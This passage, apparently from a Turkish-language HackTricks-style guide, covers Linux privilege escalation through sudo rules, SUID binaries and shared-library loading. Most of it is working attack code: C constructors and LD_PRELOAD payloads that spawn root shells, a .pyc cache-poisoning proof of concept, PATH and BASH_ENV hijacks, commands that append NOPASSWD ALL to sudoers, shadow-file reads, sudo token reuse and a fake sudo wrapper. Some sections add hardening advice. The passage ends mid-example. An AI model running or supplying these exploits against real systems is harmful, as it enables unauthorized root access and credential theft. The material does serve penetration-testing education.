Çağıran, dilimlenecek `.3mf` projesini seçebiliyorsa `prusaslicer` veya `prusa-slicer` için kısıtlanmamış, root yetkileriyle çalışabilen bir sudo izni incelenmelidir. Bir proje, G-code dışa aktarıldığında çalışan bir post-processing script'i içerebilir; özel hazırlanmış projeler 2.6.1 sürümüne kadar PrusaSlicer üzerinden komut çalıştırabilir ([CVE-2023-47268](https://security-tracker.debian.org/tracker/CVE-2023-47268)). Yetki sınırına erişilebildiği sonucuna varmadan önce geçerli sudo kuralını, binary sürümünü ve sağlayıcı yamalarını, projenin kaynağını ve ilgili dışa aktarma yolunun çalışıp çalışmadığını doğrulayın. Sabit bir proje argümanı veya etkin bir `NOEXEC` ilkesi sonucu değiştirebilir. Slicer'ın kurulu olduğunu görmek, tek başına bir yetki yükseltme yolu olduğunu kanıtlamaz.

### SETENV

Bu yönerge, kullanıcının bir şeyi çalıştırırken **bir ortam değişkeni ayarlamasına** izin verir:

```bash
$ sudo -l
User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

Bu örnek, **HTB makinesi Admirer** temel alınarak hazırlanmıştı ve script root olarak çalıştırılırken rastgele bir Python kütüphanesi yüklemek için **PYTHONPATH hijacking** saldırısına karşı **savunmasızdı**:

```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```

### Sudo ile çalıştırılabilen Python importlarında yazılabilir `__pycache__` / `.pyc` zehirleme

**Sudo ile çalıştırılabilen bir Python scripti**, paket dizininde **yazılabilir bir `__pycache__`** bulunan bir modülü import ediyorsa, önbelleğe alınmış `.pyc` dosyasını değiştirip bir sonraki import işleminde ayrıcalıklı kullanıcı olarak kod çalıştırabilirsiniz.<sup>[[30]](#references)</sup>

- Neden işe yarar:
  - CPython, bytecode önbelleklerini `__pycache__/module.cpython-<ver>.pyc` konumunda saklar.<sup>[[31]](#references)</sup>
  - Yorumlayıcı **header**'ı (kaynak dosyayla ilişkili magic + timestamp/hash metadata) doğrular, ardından bu header'dan sonra saklanan marshal edilmiş code object'i çalıştırır.
  - Dizin yazılabilir olduğu için önbelleğe alınmış dosyayı **silip yeniden oluşturabiliyorsanız**, root sahibi olan ancak yazılamayan bir `.pyc` dosyası yine de değiştirilebilir.
- Yaygın senaryo:
  - `sudo -l`, root olarak çalıştırabileceğiniz bir Python scripti veya wrapper gösterir.
  - Bu script, `/opt/app/`, `/usr/local/lib/...` vb. konumlardan yerel bir modülü import eder.
  - Import edilen modülün `__pycache__` dizini kullanıcınız veya herkes tarafından yazılabilir.

Hızlı keşif:

```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```

Ayrıcalıklı betiği inceleyebiliyorsanız, içe aktarılan modülleri ve bunların önbellek yolunu belirleyin:<sup>[[32]](#references)</sup>

```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```

Kötüye kullanım iş akışı:

1. Python'ın meşru cache dosyasını oluşturması için, sudo ile çalıştırılmasına izin verilen script'i bir kez çalıştırın (dosya zaten yoksa).
2. Meşru `.pyc` dosyasının ilk 16 byte'ını okuyup zehirlenmiş dosyada yeniden kullanın.
3. Bir payload code object derleyin, `marshal.dumps(...)` ile serileştirin, özgün cache dosyasını silin ve özgün header ile kötü amaçlı bytecode'u kullanarak yeniden oluşturun.
4. Payload'unuzun root olarak çalışması için sudo ile çalıştırılmasına izin verilen script'i tekrar çalıştırın.

Önemli notlar:

- Özgün header'ı yeniden kullanmak önemlidir; çünkü Python cache metadata'sını kaynak dosyaya göre denetler, bytecode gövdesinin kaynak dosyayla gerçekten eşleşip eşleşmediğine bakmaz.
- Bu yöntem, özellikle kaynak dosyası root'a ait ve yazılamaz durumdayken, dosyayı içeren `__pycache__` dizini yazılabilir olduğunda kullanışlıdır.
- `PYTHONDONTWRITEBYTECODE=1` ve `python -B`, Python'ın yeni `.pyc` dosyaları yazmasını engeller; önceden var olan ve saldırgan tarafından değiştirilmiş geçerli bir cache dosyasını yüklemesini **engellemez**. Kritik sınır, düşük ayrıcalıklı bir kullanıcının, ayrıcalıklı import işleminin kabul edeceği bir cache dosyasını değiştirip değiştiremeyeceğidir. Python, önbelleğe alınmış bytecode'u yüklemeden önce timestamp/size veya hash metadata'sını denetler. Bkz. [Python import reference](https://docs.python.org/3.12/reference/import.html#cached-bytecode-invalidation) ve [command-line documentation](https://docs.python.org/3.12/using/cmdline.html#envvar-PYTHONDONTWRITEBYTECODE).

Minimal proof-of-concept biçimi:

```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
    src = pathlib.Path(d) / "x.py"
    src.write_text(payload)
    code = compile(src.read_text(), str(src), "exec")
    pyc.unlink()
    pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```

Hardening:

- Ayrıcalıklı Python import path’indeki hiçbir dizinin, `__pycache__` dahil, düşük ayrıcalıklı kullanıcılar tarafından yazılabilir olmadığından emin olun.
- Mevcut `.pyc` dosyaları dahil, cache dizinlerinin sahipliğini ve izinlerini denetleyin. Bytecode yazmayı devre dışı bırakmak yeni cache oluşturulmasını azaltabilir, ancak değiştirilebilir mevcut bir cache’i etkisiz hâle getirmez.
- Yazılabilir yerel Python modüllerini ve yazılabilir cache dizinlerini, root tarafından çalıştırılan yazılabilir shell script’leri veya shared library’ler gibi değerlendirin.

### sudo env_keep üzerinden korunan BASH_ENV → root shell

sudoers `BASH_ENV`’i koruyorsa (ör. `Defaults env_keep+="ENV BASH_ENV"`), izin verilen bir komut çalıştırılırken Bash’in etkileşimsiz başlangıç davranışından yararlanarak root olarak keyfi kod çalıştırabilirsiniz.<sup>[[24]](#references)</sup>

- Neden işe yarar: Etkileşimsiz shell’lerde Bash, hedef script’i çalıştırmadan önce `$BASH_ENV` değişkenini değerlendirir ve belirtilen dosyayı kaynak olarak yükler. Birçok sudo kuralı bir script’in veya shell wrapper’ının çalıştırılmasına izin verir. `BASH_ENV` sudo tarafından korunuyorsa dosyanız root ayrıcalıklarıyla yüklenir.<sup>[[23]](#references)</sup>

- Gereksinimler:
  - Çalıştırabileceğiniz bir sudo kuralı (`/bin/bash`’i etkileşimsiz olarak çağıran herhangi bir hedef veya herhangi bir bash script’i).
  - `BASH_ENV`’in `env_keep` içinde bulunması (`sudo -l` ile kontrol edin).

- PoC:

```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```

- Güvenliği güçlendirme:
  - `BASH_ENV` (ve `ENV`) değişkenlerini `env_keep` listesinden çıkarın, `env_reset` kullanmayı tercih edin.
  - `sudo` ile çalıştırılmasına izin verilen komutlar için shell wrapper'larından kaçının; minimal binary'ler kullanın.
  - Korunan ortam değişkenleri kullanıldığında sudo I/O logging ve uyarı mekanizmalarını değerlendirin.

### Korunan HOME ile sudo üzerinden Terraform (!env_reset)

`sudo`, Terraform'ın daha ayrıcalıklı bir kullanıcı olarak çalışmasına izin verdiğinde, `!env_reset` bu kurala özel olarak hangi ortam değişkenlerinin korunduğunu kontrol etmeniz gerektiğine dair bir ipucudur. Çağıranın yazabildiği bir `.terraformrc` veya `terraform.rc` dosyasını etkin CLI yapılandırması olarak kabul etmeden önce, etkin `HOME` veya `TF_CLI_CONFIG_FILE` değerini doğrulayın. `provider_installation.dev_overrides` girdisi yalnızca sabit Terraform komutu bu provider'ı yüklerse ve çağıran, çalıştırılabilir dosyasını seçilen dizine yerleştirebilirse önem taşır.<sup>[[25]](#references)</sup>

- Gerekli provider'ı yazılabilir bir dizine yönlendirin ve provider'ın adını taşıyan kötü amaçlı bir eklenti bırakın (ör. `terraform-provider-examples`):

```hcl
# ~/.terraformrc
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/dev/shm"
  }
  direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```

Terraform, Go plugin el sıkışması başarısız olur ancak kapanmadan önce payload'ı root olarak çalıştırır ve geride bir SUID shell bırakır.

### TF_VAR overrides + symlink validation bypass

Belirli sudo kuralı bu değişkenleri koruyorsa, Terraform değişkenleri `TF_VAR_<name>` ortam değişkenleri aracılığıyla sağlanabilir. Kaynak symlink'ini **okumak** için ayrıca bağlantıyı izleyen ve korumalı sonucu çağıranın okuyabileceği bir hedefe kopyalayan bir provider gerekir. Hedef symlink'ine **yazmak** ise ayrı olarak çağıranın kontrolündeki bir hedef girdisi ve yazma sırasında bu bağlantıyı izleyen ayrıcalıklı bir provider gerektirir; daha sonra çalışan zamanlanmış bir iş, bunun olası sonuçlarından yalnızca biridir. Her iki yöntemi de denemeden önce `sudo -l`, `stat` ve `readlink` gibi salt okunur komutlarla tam sudo iznini, ilgili `.tf` dosyalarını, seçili CLI yapılandırmasını ve yolların sahipliğini inceleyin. `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` gibi zayıf sözdizimsel doğrulamalar symlink'leri çözümlemez:<sup>[[25]](#references)</sup>

```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```

Terraform symlink'i çözümler ve gerçek `/root/root.txt` dosyasını saldırganın okuyabildiği bir hedefe kopyalar. Aynı yaklaşım, hedef symlink'leri önceden oluşturarak ayrıcalıklı konumlara **yazmak** için de kullanılabilir (ör. provider'ın hedef yolunu `/etc/cron.d/` içini gösterecek şekilde ayarlamak).

### requiretty / !requiretty

Bazı eski dağıtımlarda sudo, sudo'nun yalnızca etkileşimli bir TTY'den çalışmasını zorlayan `requiretty` ile yapılandırılabilir. `!requiretty` ayarlanmışsa (veya bu seçenek yoksa), sudo reverse shell'ler, cron jobs veya script'ler gibi etkileşimsiz bağlamlardan çalıştırılabilir.

```bash
Defaults !requiretty
```

Bu tek başına doğrudan bir güvenlik açığı değildir, ancak tam bir PTY gerektirmeden sudo kurallarının kötüye kullanılabileceği durumları artırır.

### Sudo env_keep+=PATH / güvensiz secure_path → PATH hijack

`sudo -l` çıktısında `env_keep+=PATH` veya saldırganın yazabildiği girdiler içeren bir `secure_path` (ör. `/home/<user>/bin`) görünüyorsa, sudo tarafından izin verilen hedef içindeki tam yolu belirtilmemiş harici bir komutun yerine başka bir komut çalıştırılabilir.<sup>[[3]](#references)</sup> Etkin bir `secure_path` olmaması da **yalnızca** komutun sudo ortamının çağıranın kontrolündeki bir `PATH` değerini koruması durumunda incelenmelidir; tek başına olmaması, böyle olduğunu kanıtlamaz. İzin verilen betiği çalıştırmadan okuyun, ardından tam RunAs ve argüman kuralını, etkin komut arama yolunu ve komut adıyla eşleşen, daha önce aranan, yazılabilir ve içinden geçilebilir bir dizin bulunduğunu doğrulayın. Kimlik doğrulama, `NOEXEC`, shell built-in'leri ve mutlak komut yolları sonucu değiştirebilir.

- Gereksinimler: tam yolları belirtmeden komut çağıran (`free`, `df`, `ps` vb.) bir betiği/ikili dosyayı çalıştıran bir sudo kuralı (genellikle `NOPASSWD`) ve önce aranan, yazılabilir bir PATH girdisi.

```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```

### Sudo yürütmesinde yolları atlatma
Diğer dosyaları okumak veya **symlinks** kullanmak için **Jump** yapın. Örneğin sudoers dosyasında: _hacker10 ALL= (root) /bin/less /var/log/\*_

```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```

**wildcard** kullanılırsa (\*), daha da kolaydır:

```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```

**Önlemler**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Komut yolu belirtilmeden verilen Sudo komutu/SUID binary

Tek bir komut için **sudo izni** **yol belirtilmeden** verilmişse: _hacker10 ALL= (root) less_, PATH değişkenini değiştirerek bunu exploit edebilirsiniz.

```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```

Bu teknik, **suid** binary **başka bir komutu yolunu belirtmeden çalıştırıyorsa da kullanılabilir (garip bir SUID binary'nin içeriğini her zaman** _**strings**_ **ile kontrol edin)**.

[Çalıştırılacak payload örnekleri.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### Komut yolu içeren SUID binary

**suid** binary **başka bir komutu yolunu belirterek çalıştırıyorsa**, suid dosyasının çağırdığı komutun adını taşıyan bir **fonksiyon export etmeyi** deneyebilirsiniz.

Örneğin, bir suid binary _**/usr/sbin/service apache2 start**_ komutunu çağırıyorsa, fonksiyonu oluşturup export etmeyi deneyin:

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```

Ardından, suid binary'yi çağırdığınızda bu işlev yürütülür

### Özel SUID kopyalama wrapper'ları

Kaynağı ve hedef yolları kabul eden, root'a ait bir SUID yardımcı programı iki farklı güven sınırını aşabilir. Her iki argümandan da bir shell komutu oluşturuyorsa (örneğin, oluşturulmuş bir `cp` komutunu `system()` işlevine iletiyorsa), shell metakarakterleri etkili ayrıcalıklarıyla başka bir komut çalıştırabilir. `cp` komutunu shell kullanmadan güvenli biçimde çağırsın bile, kısıtlanmamış bir hedef `/etc/passwd` gibi dosyalara ayrıcalıklı olarak istenen içeriğin yazılmasına olanak tanıyabilir. Wrapper'ın argüman işleme biçimini, effective UID davranışını, hedef kısıtlamalarını ve kopyalanan dosyanın içeriğinin çağıran tarafından kontrol edilip edilemediğini inceleyin; genel bir `cp` hatası veya tek başına SUID biti bu yolların herhangi birinin mümkün olduğunu kanıtlamaz. Elle test yapmadan önce binary'yi ve izinlerini pasif olarak listeleyin.

### SUID wrapper tarafından yürütülen yazılabilir script

Özel uygulamalarda sık görülen bir yanlış yapılandırma, root'a ait bir SUID binary wrapper'ın bir script yürütmesi, ancak script'in kendisinin düşük ayrıcalıklı kullanıcılar tarafından yazılabilir olmasıdır.

Tipik örüntü:

```c
int main(void) {
    system("/bin/bash /usr/local/bin/backup.sh");
}
```

`/usr/local/bin/backup.sh` yazılabilir durumdaysa, payload komutlarını ekleyebilir ve ardından SUID wrapper'ı çalıştırabilirsiniz:

```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```

Hızlı kontroller:

```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```

Bu saldırı yolu, özellikle `/usr/local/bin` dizininde bulunan "maintenance"/"backup" wrapper'larında yaygındır.

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** ortam değişkeni, yükleyici tarafından standart C kütüphanesi (`libc.so`) dahil diğer tüm kütüphanelerden önce yüklenecek bir veya daha fazla paylaşımlı kütüphaneyi (.so dosyaları) belirtmek için kullanılır. Bu işlem, bir kütüphaneyi önceden yükleme olarak bilinir.

Ancak sistem güvenliğini korumak ve bu özelliğin, özellikle **suid/sgid** yürütülebilir dosyalarla kötüye kullanılmasını önlemek için sistem bazı koşulları uygular:

- Gerçek kullanıcı kimliği (_ruid_) etkin kullanıcı kimliği (_euid_) ile eşleşmeyen yürütülebilir dosyalar için yükleyici **LD_PRELOAD**'u yok sayar.
- suid/sgid ayarlı yürütülebilir dosyalarda yalnızca standart yollarda bulunan ve kendileri de suid/sgid olan kütüphaneler önceden yüklenir.

`sudo` ile komut çalıştırma yetkiniz varsa ve `sudo -l` çıktısında **env_keep+=LD_PRELOAD** ifadesi yer alıyorsa, ayrıcalık yükseltme mümkün olabilir. Bu yapılandırma, **LD_PRELOAD** ortam değişkeninin korunup `sudo` ile komut çalıştırıldığında da tanınmasını sağlar; bu da yükseltilmiş ayrıcalıklarla rastgele kod çalıştırılmasına yol açabilir.<sup>[[9]](#references)</sup>

```
Defaults        env_keep += LD_PRELOAD
```

**/tmp/pe.c** olarak kaydedin.

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Ardından **bunu derleyin**:

```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

Son olarak, çalıştırarak **yetkileri yükseltin**

```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```

> [!CAUTION]
> Saldırgan **LD_LIBRARY_PATH** env değişkenini kontrol ediyorsa benzer bir privesc tekniği kötüye kullanılabilir; çünkü kütüphanelerin aranacağı yolu kontrol eder.

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```

### SUID Binary – .so injection

Alışılmadık görünen **SUID** izinlerine sahip bir binary ile karşılaşıldığında, **.so** dosyalarını düzgün yükleyip yüklemediğini doğrulamak iyi bir uygulamadır. Bu, aşağıdaki komut çalıştırılarak kontrol edilebilir:<sup>[[17]](#references)</sup>

```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```

Örneğin, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ gibi bir hatayla karşılaşmak, istismar olasılığına işaret eder.

Bunu istismar etmek için _"/path/to/.config/libcalc.c"_ gibi bir C dosyası oluşturup içine şu kodu yazabilirsiniz:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

Bu kod, derlenip çalıştırıldığında, dosya izinlerini değiştirerek ve yükseltilmiş ayrıcalıklarla bir shell çalıştırarak ayrıcalıkları yükseltmeyi amaçlar.

Yukarıdaki C dosyasını şu komutla bir shared object (.so) dosyasına derleyin:

```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```

Son olarak, etkilenen SUID binary'sini çalıştırmak exploit'i tetikleyerek sistemin ele geçirilmesine yol açabilir.

## Shared Object Hijacking

```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

Artık yazma iznimiz olan bir klasörden kütüphane yükleyen bir SUID binary bulduğumuza göre, gerekli adı kullanarak bu klasörde kütüphaneyi oluşturalım:

```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

Şunun gibi bir hata alırsanız

```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```

bu, oluşturduğunuz kütüphanenin `a_function_name` adlı bir işleve sahip olması gerektiği anlamına gelir.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io), saldırganların yerel güvenlik kısıtlamalarını aşmak için istismar edebileceği Unix ikililerinin derlenmiş bir listesidir. [**GTFOArgs**](https://gtfoargs.github.io/) ise bir komuta **yalnızca argüman enjekte edebildiğiniz** durumlar için aynı şeyi sunar.

Proje; kısıtlı kabuklardan çıkmak, ayrıcalıkları yükseltmek veya yüksek ayrıcalıkları korumak, dosya aktarmak, bind ve reverse shell'ler başlatmak ve diğer post-exploitation görevlerini kolaylaştırmak için kötüye kullanılabilecek Unix ikililerinin meşru işlevlerini toplar.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

`sudo -l` komutuna erişebiliyorsanız, herhangi bir sudo kuralını istismar etmenin bir yolunu bulup bulmadığını kontrol etmek için [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) aracını kullanabilirsiniz.

### Sudo Token'larını Yeniden Kullanma

**Sudo erişiminiz** olup parolayı bilmediğiniz durumlarda, **bir sudo komutunun çalıştırılmasını bekleyip ardından oturum token'ını ele geçirerek** ayrıcalıklarınızı yükseltebilirsiniz.<sup>[[18]](#references)</sup>

Ayrıcalıkları yükseltmek için gerekenler:

- "_sampleuser_" kullanıcısı olarak zaten bir shell'iniz var
- "_sampleuser_" **son 15 dakika içinde** bir şey çalıştırmak için `sudo` **kullanmış** (varsayılan olarak, bu süre sudo token'ının geçerlilik süresidir ve bu süre boyunca herhangi bir parola girmeden `sudo` kullanabilirsiniz)
- `cat /proc/sys/kernel/yama/ptrace_scope` komutunun çıktısı 0
- `gdb` kullanılabilir durumda (yükleyebilmeniz gerekir)

(`echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` komutuyla `ptrace_scope` değerini geçici olarak etkinleştirebilir veya `/etc/sysctl.d/10-ptrace.conf` dosyasını değiştirip `kernel.yama.ptrace_scope = 0` ayarını yaparak kalıcı olarak etkinleştirebilirsiniz.)

Tüm bu gereksinimler karşılanıyorsa, **ayrıcalıklarınızı şu aracı kullanarak yükseltebilirsiniz:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **İlk exploit** (`exploit.sh`), _/tmp_ içinde `activate_sudo_token` ikilisini oluşturur. Bunu **oturumunuzda sudo token'ını etkinleştirmek** için kullanabilirsiniz (otomatik olarak root shell'i açılmaz; `sudo su` komutunu çalıştırın):

```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```

- **İkinci exploit** (`exploit_v2.sh`), _/tmp_ içinde **root'a ait ve setuid bit'i ayarlanmış** bir sh shell oluşturur.

```bash
bash exploit_v2.sh
/tmp/sh -p
```

- **Üçüncü exploit** (`exploit_v3.sh`), **sudoers dosyası oluşturarak sudo token’larını kalıcı hâle getirir ve tüm kullanıcıların sudo kullanmasına izin verir**.

```bash
bash exploit_v3.sh
sudo su
```

### /var/run/sudo/ts/\<Username>

Klasördeki veya klasör içinde oluşturulan dosyalardan herhangi biri üzerindeki **yazma izinlerine** sahipseniz, bir kullanıcı ve PID için **sudo token oluşturmak** üzere [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) binary’sini kullanabilirsiniz.\
Örneğin, _/var/run/sudo/ts/sampleuser_ dosyasının üzerine yazabiliyor ve bu kullanıcı olarak PID’si 1234 olan bir shell’e sahipseniz, parolayı bilmenize gerek kalmadan şu şekilde **sudo ayrıcalıkları elde edebilirsiniz**:

```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```

### /etc/sudoers, /etc/sudoers.d

`/etc/sudoers` dosyası ve `/etc/sudoers.d` içindeki dosyalar, `sudo` kullanabilecek kişileri ve kullanım şeklini yapılandırır. Bu dosyalar **varsayılan olarak yalnızca root kullanıcısı ve root grubu tarafından okunabilir**.\
**Bu dosyayı** **okuyabilirseniz**, **ilginç bilgiler edinebilirsiniz**; herhangi bir dosyaya **yazabilirseniz** **yetki yükseltebilirsiniz**.

```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```

Yazma izniniz varsa, bu izni kötüye kullanabilirsiniz.

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```

Bu izinleri kötüye kullanmanın başka bir yolu:

```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```

### DOAS

OpenBSD için `doas` gibi `sudo` ikilisinin bazı alternatifleri vardır; yapılandırmasını `/etc/doas.conf` dosyasında kontrol etmeyi unutmayın.

```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```

`doas` bir editöre veya yorumlayıcıya izin veriyorsa, GTFOBins tarzı kaçış yöntemlerini kontrol edin:

```bash
doas vim
:!/bin/sh
```

Root yetkisiyle çalışabilen bir `doas` kuralı, orijinal Python tabanlı `dstat` için eklenti yolunun da incelenmesini gerektirir. [Kılavuzunda](https://github.com/dstat-real/dstat/blob/master/docs/dstat.1) ve [kaynak kodunda](https://github.com/dstat-real/dstat/blob/master/dstat), `dstat_*.py` eklentilerinin bulunduğu konumlar arasında `/usr/share/dstat/` ve `/usr/local/share/dstat/` listelenir. Mevcut kullanıcı, kurulu sürümün gerçekten kullandığı bir konuma yazma ve arama iznine sahipse seçilen bir eklenti `doas` RunAs kimliğiyle çalışabilir. Etkin kuralı, ilgili sürümdeki eklenti arama yöntemini, dizin ve üst dizin izinlerini veya ACL’leri ve çağıranın eklenti seçip seçemediğini doğrulayın; yalnızca bir `dstat` kuralı ya da yazılabilir bir dizin, araştırmaya devam etmek için bir ipucudur. Diğer `dstat` uygulamaları farklı eklenti sistemleri kullanabilir. Bir eklentiyi yüklemeden meta verileri pasif biçimde inceleyin.

### Sudo Hijacking

Bir **kullanıcının genellikle bir makineye bağlandığını ve yetkilerini yükseltmek için `sudo` kullandığını** biliyorsanız ve o kullanıcının bağlamında bir shell elde ettiyseniz, kodunuzu root olarak ve ardından kullanıcının komutunu çalıştıracak **yeni bir sudo çalıştırılabilir dosyası oluşturabilirsiniz**. Sonra, kullanıcı `sudo` çalıştırdığında sizin sudo çalıştırılabilir dosyanızın çalışması için kullanıcı bağlamının **$PATH** değerini değiştirin (örneğin, `.bash_profile` dosyasına yeni yolu ekleyerek).

Kullanıcı farklı bir shell kullanıyorsa (bash değilse), yeni yolu eklemek için başka dosyaları değiştirmeniz gerekir. Örneğin [sudo-piggyback](https://github.com/APTy/sudo-piggyback), `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` dosyalarını değiştirir. Başka bir örneği [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) içinde bulabilirsiniz.

Ya da şöyle bir şey çalıştırarak:

```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```

## Paylaşılan Kütüphane

### ld.so

`/etc/ld.so.conf` dosyası, **yüklenen yapılandırma dosyalarının nereden geldiğini** belirtir. Genellikle bu dosya şu yolu içerir: `include /etc/ld.so.conf.d/*.conf`

Bu, `/etc/ld.so.conf.d/*.conf` içindeki yapılandırma dosyalarının okunacağı anlamına gelir. Bu yapılandırma dosyaları, **kütüphanelerin** aranacağı **diğer klasörleri gösterir**. Örneğin, `/etc/ld.so.conf.d/libc.conf` dosyasının içeriği `/usr/local/lib` şeklindedir. **Bu, sistemin kütüphaneleri `/usr/local/lib` içinde arayacağı anlamına gelir**.

Herhangi bir nedenle **bir kullanıcının** belirtilen yollardan herhangi biri üzerinde yazma izni varsa (`/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` içindeki herhangi bir dosya veya `/etc/ld.so.conf.d/*.conf` içindeki yapılandırma dosyalarında belirtilen herhangi bir klasör), ayrıcalıklarını yükseltebilir.\
**Bu yanlış yapılandırmanın nasıl istismar edileceğine** aşağıdaki sayfadan göz atın:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH

```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
```

lib'i `/var/tmp/flag15/` içine kopyalayarak, `RPATH` değişkeninde belirtildiği üzere program bu konumdaki lib'i kullanacaktır.

```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x005b0000)
